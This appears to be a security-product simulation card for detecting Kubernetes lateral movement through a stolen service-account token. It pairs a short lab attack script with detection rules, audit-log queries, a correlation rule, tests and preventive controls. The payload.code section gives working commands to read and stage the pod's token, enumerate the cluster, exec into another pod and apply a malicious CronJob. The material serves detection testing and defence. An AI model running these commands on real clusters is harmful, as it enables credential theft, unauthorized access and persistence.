identity.name: Kubernetes Lateral Movement via Stolen Service-Account Token (T1021)
identity.summary: A compromised pod harvests its mounted service-account token, queries the Kubernetes API server directly for namespaces, copies the token to /tmp, then uses kubectl with the stolen token to enumerate pods cluster-wide, exec into an adjacent pod, and deploy a malicious CronJob for persistence. Cortex Cloud detects the in-pod token use and kubectl abuse via runtime BIOCs, while cloud_audit_logs (…
identity.description: Once an attacker controls one pod, the mounted service-account token is the pivot to the rest of the cluster. Unit 42's research on Kubernetes targeting documents adversaries reading /var/run/secrets/kubernetes.io/serviceaccount/token, calling the API server, and abusing over-permissive RBAC to enumerate, exec, and persist across namespaces. This scenario reproduces that chain from a compromised pod: it reads the namespace and token, curls the API server for the namespace list, copies the token to /tmp staging, downloads kubectl and runs get pods --all-namespaces with the stolen token, performs kubectl exec into an adjacent pod, and applies a malicious CronJob. The detection approach spans two data planes: container-runtime telemetry (xdr_data with container context) catches the in-pod token read, the kubectl binary download, and the kubectl exec/apply invocations, while the Kubernetes API audit log (cloud_audit_logs) catches the corresponding anomalous verbs — list namespaces, list pods across all namespaces, create on the exec subresource, and create cronjobs — attributed to a workload service account. A correlation rule fuses both planes into a single high-severity Lateral Movement incident, demonstrating XSIAM's runtime + control-plane stitching.

execution.framework_reference_id: T1021 — Kubernetes lateral movement via stolen service-account token, kubectl exec, and CronJob persistence.

prerequisites.description: Cortex Cloud (Kubernetes audit ingestion + runtime defender) configured; Cortex XDR Linux agent reporting on the node.
Lab environment matching scenario SIM-CDR-004 — a pod with a mounted service-account token and over-permissive RBAC for safe lateral-movement validation.

payload.code:
# Kubernetes lateral movement via stolen SA token — lab cluster only.
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); cp /var/run/secrets/kubernetes.io/serviceaccount/token /tmp/stolen_sa_token
curl -sSk --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
kubectl --server=https://kubernetes.default.svc --token="$TOKEN" --insecure-skip-tls-verify get pods --all-namespaces
kubectl --server=https://kubernetes.default.svc --token="$TOKEN" --insecure-skip-tls-verify exec -n default <pod> -- id
kubectl --server=https://kubernetes.default.svc --token="$TOKEN" --insecure-skip-tls-verify apply -f /tmp/cortexsim-cronjob.yaml

expected_artifacts.description: Service-account token read and copied to /tmp from inside a pod.
kubectl exec invoked from inside a container.
Kubernetes API audit event: list pods across all namespaces by a workload service account.
expected_artifacts.expected_value: verb = "list" and objectRef.resource = "pods" and user.username contains "system:serviceaccount"

expected_artifacts.description: Kubernetes API audit event: create on the pods/exec subresource.

cleanup.code:
kubectl --insecure-skip-tls-verify delete cronjob cortexsim-persistence-sim -n default 2>/dev/null || true
rm -f /tmp/stolen_sa_token /tmp/pod_enum.txt /tmp/cortexsim-cronjob.yaml /tmp/kubectl
echo '[CortexSim] SIM-CDR-004 cleanup complete'

biocs.name: CDR-004 Pod API Server Enumeration With Service Account Token
biocs.description: Kubernetes API server enumeration from within pod using mounted service account token. A container process curls the in-cluster API server with a Bearer token to list namespaces.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("curl", "wget")
| filter action_process_image_command_line contains "kubernetes.default.svc"
| filter action_process_image_command_line contains_any ("Authorization: Bearer", "serviceaccount/token", "/api/v1/namespaces")

biocs.name: CDR-004 Service Account Token Used For API Discovery Audit
biocs.description: Service account token used for API server discovery — anomalous cluster enumeration behavior. The Kubernetes audit log records a workload service account listing namespaces or cluster resources.
biocs.logic:
dataset = cloud_audit_logs
| filter cloud_provider = "kubernetes" or log_source = "k8s_audit"
| filter verb in ("list", "get")
| filter objectRef_resource in ("namespaces", "nodes")
| filter user_username contains "system:serviceaccount"

biocs.name: CDR-004 Service Account Token Read And Copied In Pod
biocs.description: Service account token read and copied — Kubernetes credential theft from mounted secret volume. A pod process reads the projected token and copies it elsewhere on disk.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("cat", "cp", "bash", "sh")
| filter action_process_image_command_line contains "serviceaccount/token"

biocs.name: CDR-004 Service Account Token Staged To Tmp In Pod
biocs.description: Sensitive Kubernetes credential file access pattern — token exfiltration to /tmp staging directory. The mounted token is copied to a /tmp staging path for later reuse.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter event_sub_type = ENUM.FILE_CREATE
| filter container_id != null
| filter action_file_path contains "/tmp/"
| filter action_file_path contains_any ("token", "sa_token", "stolen")

biocs.name: CDR-004 kubectl All Namespaces Enumeration From Pod
biocs.description: kubectl --all-namespaces enumeration from within pod — cross-namespace discovery using stolen token. kubectl is run inside a container with --all-namespaces to map workloads cluster-wide.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "kubectl"
| filter action_process_image_command_line contains "get pods"
| filter action_process_image_command_line contains_any ("--all-namespaces", "-A")

biocs.name: CDR-004 Cluster Wide Pod Discovery Audit Anomaly
biocs.description: Cluster-wide pod discovery via kubectl in container — lateral movement reconnaissance pattern. The Kubernetes audit log records a list pods request scoped to all namespaces by a workload identity.
biocs.logic:
dataset = cloud_audit_logs
| filter cloud_provider = "kubernetes" or log_source = "k8s_audit"
| filter verb = "list"
| filter objectRef_resource = "pods"
| filter objectRef_namespace = null or objectRef_namespace = ""
| filter user_username contains "system:serviceaccount"

biocs.name: CDR-004 kubectl Exec Into Adjacent Pod Lateral Movement
biocs.description: kubectl exec into pod in different namespace — lateral movement via Kubernetes API (high fidelity CDR BIOC). kubectl exec is invoked from inside one container to run a command in another pod.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "kubectl"
| filter action_process_image_command_line contains "exec"
| filter action_process_image_command_line contains_any ("-n ", "--namespace")

biocs.name: CDR-004 Pod Exec Subresource Create Audit Anomaly
biocs.description: Cross-namespace pod exec from compromised container — Kubernetes lateral movement chain detected. The Kubernetes audit log records a create on the pods/exec subresource by a workload service account.
biocs.logic:
dataset = cloud_audit_logs
| filter cloud_provider = "kubernetes" or log_source = "k8s_audit"
| filter verb = "create"
| filter objectRef_resource = "pods"
| filter objectRef_subresource = "exec"
| filter user_username contains "system:serviceaccount"

biocs.name: CDR-004 Malicious CronJob Creation Via kubectl From Pod
biocs.description: Kubernetes CronJob creation via kubectl — scheduled task persistence mechanism in cluster. kubectl apply creates a CronJob resource from inside a compromised pod.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "kubectl"
| filter action_process_image_command_line contains_any ("apply", "create")
| filter action_process_image_command_line contains_any ("cronjob", ".yaml", "-f ")

biocs.name: CDR-004 CronJob Resource Create Audit Anomaly
biocs.description: CronJob creation anomaly — new batch workload created from compromised pod context, cross-namespace pattern. The Kubernetes audit log records a create on cronjobs by a workload service account.
biocs.logic:
dataset = cloud_audit_logs
| filter cloud_provider = "kubernetes" or log_source = "k8s_audit"
| filter verb = "create"
| filter objectRef_resource = "cronjobs"
| filter user_username contains "system:serviceaccount"

xql_queries.name: CDR-004 Validate kubectl Exec From Pod In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "kubectl" and action_process_image_command_line contains "exec"
| fields _time, agent_hostname, container_id, actor_effective_username, action_process_image_command_line

xql_queries.name: CDR-004 Validate Pod Exec Or CronJob Create In K8s Audit
xql_queries.query:
dataset = cloud_audit_logs
| filter _time > to_timestamp(current_time() - 1800)
| filter verb = "create"
| filter (objectRef_resource = "pods" and objectRef_subresource = "exec") or objectRef_resource = "cronjobs"
| filter user_username contains "system:serviceaccount"
| fields _time, user_username, verb, objectRef_resource, objectRef_subresource, objectRef_namespace, sourceIPs

xql_queries.name: CDR-004 Validate Service Account Token Theft In Pod
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter container_id != null
| filter action_process_image_command_line contains "serviceaccount/token"
| filter actor_process_image_name in ("cat", "cp", "bash", "sh")
| fields _time, agent_hostname, container_id, actor_process_image_name, action_process_image_command_line

correlation_rules.name: Kubernetes Lateral Movement Chain — Runtime And Audit
correlation_rules.logic: BIOC(CDR-004 Service Account Token Read And Copied In Pod) OR BIOC(CDR-004 kubectl All Namespaces Enumeration From Pod) OR BIOC(CDR-004 Cluster Wide Pod Discovery Audit Anomaly) OR BIOC(CDR-004 kubectl Exec Into Adjacent Pod Lateral Movement) OR BIOC(CDR-004 Pod Exec Subresource Create Audit Anomaly) OR BIOC(CDR-004 Malicious CronJob Creation Via kubectl From Pod) OR BIOC(CDR-004 CronJob Resource Create Audit Anomaly)

analytics_modules: Cortex Cloud — Kubernetes audit anomaly (service account performing cross-namespace verbs)
Cortex XDR Analytics — In-pod kubectl exec / token theft behavioral cluster

products.evidence_query: dataset = cloud_audit_logs | filter verb = "create" and objectRef_subresource = "exec" | fields _time, user_username, objectRef_namespace, sourceIPs
preset = xdr_data | filter actor_process_image_name = "kubectl" and action_process_image_command_line contains "exec" | fields _time, container_id, action_process_image_command_line
Correlation CR-CDR-0004 fuses in-pod token theft and kubectl abuse (runtime) with the matching list/exec/create verbs (K8s audit) into a single Lateral Movement incident.

use_cases.name: Kubernetes Lateral Movement Detection — Stolen Token
use_cases.description: Detect and stitch the stolen-token lateral-movement chain (token theft → API enumeration → cross-namespace exec → CronJob persistence) across runtime and K8s audit planes.

test_cases.objective: kubectl exec and the K8s audit exec/create verbs fire their Cortex detections.
preconditions: Cortex Cloud ingesting Kubernetes API audit logs.
Cortex XDR Linux agent >= 8.4.0 reporting on the node.
BIOCs from this card imported and enabled.
steps: Run SIM-CDR-004 steps 1-5 inside the lab pod.
Observe BIOC alerts (runtime + audit) per stage in the Cortex console.
success_criteria: BIOC `CDR-004 kubectl Exec Into Adjacent Pod Lateral Movement` fires within 60s.
BIOC `CDR-004 Pod Exec Subresource Create Audit Anomaly` fires from the K8s audit log.
All three XQL validation queries return >= 1 row.

test_cases.objective: Runtime and audit signals stitch into one Lateral Movement incident.
success_criteria: Correlation `CR-CDR-0004` groups the runtime and audit stages into one incident.

preventive_controls: Set automountServiceAccountToken: false on workloads that do not call the API; bind least-privilege RBAC roles.
Prohibit pods/exec and cronjobs create verbs for workload service accounts via RBAC.
Use a network policy to deny pod-to-API and pod-to-pod traffic except where required.
Enable Cortex Cloud admission control to block CronJob creation from non-pipeline identities.
detection_engineering: Alert on any in-pod read+copy of the service-account token and on kubectl exec from a container.
Alert on K8s audit list pods --all-namespaces, create pods/exec, and create cronjobs by system:serviceaccount identities.
Correlate the runtime kubectl invocation with the matching API audit verb to confirm intent and stitch the chain.

references.title: Unit42 - Attackers Are Increasingly Targeting Kubernetes
